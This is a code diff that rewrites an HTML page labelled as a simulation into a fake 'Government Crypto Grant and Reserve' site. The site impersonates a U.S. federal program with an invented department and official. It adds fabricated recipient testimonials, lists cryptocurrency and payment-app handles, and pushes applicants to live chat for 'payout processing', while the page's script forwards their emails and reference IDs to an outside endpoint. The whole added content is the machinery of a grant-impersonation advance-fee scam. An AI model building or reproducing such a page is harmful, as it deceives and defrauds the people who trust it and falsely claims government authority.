@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Research Grant Portal</title>
+    <title>Government Crypto Grant and Reserve</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -21,20 +21,30 @@
         header {
             background-color: #0073aa;
             color: white;
-            padding: 10px 0;
+            padding: 20px 0;
             text-align: center;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
         header h1 {
             margin: 0;
-            font-size: 24px;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .description {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            text-align: center;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
         }
         .sidebar {
             float: left;
             width: 25%;
             background-color: rgba(255, 255, 255, 0.9);
-            padding: 10px;
+            padding: 15px;
             box-shadow: 2px 0 5px rgba(0,0,0,0.1);
+            border-radius: 5px;
         }
         .main-content {
             float: right;
@@ -71,12 +81,20 @@
         button:hover {
             background-color: #004d75;
         }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
         #statusMessage {
             margin-top: 10px;
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 4px;
             display: none;
+        }
+        .status-active {
+            color: green;
+            font-weight: bold;
         }
         .payout-section {
             margin-top: 20px;
@@ -85,18 +103,64 @@
             color: white;
             border-radius: 5px;
         }
+        .payment-methods {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+        }
+        .payment-method {
+            margin-bottom: 10px;
+            padding: 8px;
+            background-color: white;
+            color: #333;
+            border-radius: 3px;
+        }
+        .testimonials {
+            margin-top: 20px;
+            clear: both;
+        }
+        .testimonial {
+            display: inline-block;
+            width: 30%;
+            margin: 0 1.5% 20px;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .testimonial img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+        footer {
+            clear: both;
+            text-align: center;
+            padding: 10px;
+            background-color: #0073aa;
+            color: white;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
     <header>
-        <h1>Research Grant Portal</h1>
+        <h1>Government Crypto Grant and Reserve</h1>
+        <p>Empowering American Innovation Through Secure Crypto Funding – Established 2025</p>
     </header>
     <div class="container">
+        <div class="description">
+            <p>Welcome to the official Government Crypto Grant and Reserve Program. Launched in 2025, this initiative provides eligible citizens with access to cryptocurrency grants to support innovative projects, small businesses, and personal financial growth. Our secure platform ensures fast, transparent payouts via trusted methods. All applications are processed confidentially by federal officials.</p>
+        </div>
         <div class="sidebar">
-            <h3>Account Info</h3>
-            <p><strong>User:</strong> ResearchStudent01</p>
-            <p><strong>Status:</strong> Active</p>
-            <button onclick="alert('Profile update feature disabled in simulation.')">Update Profile</button>
+            <h3>Official Account</h3>
+            <p><strong>Name:</strong> Federal Grant Administrator – Dr. Elena Vasquez</p>
+            <p><strong>ID:</strong> GOV-2025-USA-4782</p>
+            <p><strong>Status:</strong> <span class="status-active">Live Green</span></p>
+            <p><strong>Department:</strong> U.S. Department of Innovation and Crypto Reserves</p>
         </div>
         <div class="main-content">
             <h2>Applicant Registration</h2>
@@ -113,13 +177,53 @@
             </form>
             <div id="statusMessage"></div>
             <div class="payout-section">
-                <h3>Payout Status</h3>
+                <h3>Live Payout Processing</h3>
                 <p><strong>Reference ID:</strong> <span id="displayRefId"></span></p>
                 <p><strong>Status:</strong> <span id="statusDisplay">Pending</span></p>
-                <button onclick="alert('Check payout details disabled in simulation.')">Check Payout Details</button>
+                <p>Once approved, receive your grant instantly via secure channels. Payouts processed in real-time for 2025 compliance.</p>
+                <div class="payment-methods">
+                    <div class="payment-method">
+                        <strong>Bitcoin (BTC) Wallet:</strong><br>
+                        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh – Receiving live payouts for approved grants.
+                    </div>
+                    <div class="payment-method">
+                        <strong>Cash App Tag:</strong><br>
+                        $GovGrant2025 – Instant transfers for verified applicants.
+                    </div>
+                    <div class="payment-method">
+                        <strong>PayPal Email:</strong><br>
+                        grants@usacrypto.gov – Secure electronic payouts available 24/7.
+                    </div>
+                    <div class="payment-method">
+                        <strong>Venmo Username:</strong><br>
+                        @USAGrantReserve – Quick mobile payouts for mobile users.
+                    </div>
+                    <div class="payment-method">
+                        <strong>Zelle Phone:</strong><br>
+                        +1 (202) 555-0199 – Bank-linked transfers for immediate funding.
+                    </div>
+                </div>
             </div>
         </div>
     </div>
+    <div class="testimonials">
+        <h2 style="text-align: center; clear: both;">Success Stories from 2025 Recipients</h2>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=80&h=80&fit=crop&crop=face" alt="Sarah M.">
+            <p><strong>Sarah M., Entrepreneur</strong><br>"Received my $10,000 BTC grant in under 24 hours! This program changed my startup."</p>
+        </div>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" alt="Mike R.">
+            <p><strong>Mike R., Innovator</strong><br>"PayPal payout was seamless. As a 2025 recipient, I highly recommend this official reserve."</p>
+        </div>
+        <div class="testimonial">
+            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" alt="Lisa T.">
+            <p><strong>Lisa T., Small Business Owner</strong><br>"Cash App transfer arrived instantly. Government Crypto Grant made my dreams reality!"</p>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2025 U.S. Government Crypto Grant and Reserve. All rights reserved. Secure and Official.</p>
+    </footer>
 
     <!-- Live Chat Widget (Smartsupp) -->
     <script type="text/javascript">
@@ -140,7 +244,7 @@
             event.preventDefault();
 
             const email = document.getElementById('email').value;
-            const referenceId = 'REF-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            const referenceId = 'GCR-' + Math.random().toString(36).substr(2, 9).toUpperCase();
             const statusMessage = document.getElementById('statusMessage');
             const displayRefId = document.getElementById('displayRefId');
             const statusDisplay = document.getElementById('statusDisplay');
@@ -149,10 +253,10 @@
             displayRefId.textContent = referenceId;
             statusDisplay.textContent = 'Pending';
             statusMessage.style.display = 'block';
-            statusMessage.textContent = 'Reference code generated. Check status via live chat.';
+            statusMessage.textContent = 'Reference code generated. Contact live chat for approval and payout processing.';
 
             const data = {
-                content: `🔥 New Registration:
+                content: `🔥 New Registration - Government Crypto Grant:
                 \nEmail: *${email}*
                 \nReference ID: *${referenceId}*`
             };
@@ -172,7 +276,7 @@
         function updateStatus(refId, status) {
             if (document.getElementById('displayRefId').textContent === refId) {
                 document.getElementById('statusDisplay').textContent = status;
-                document.getElementById('statusMessage').textContent = `Status updated to ${status}.`;
+                document.getElementById('statusMessage').textContent = `Status updated to ${status}. Payout ready via selected method.`;
             }
         }
     </script>
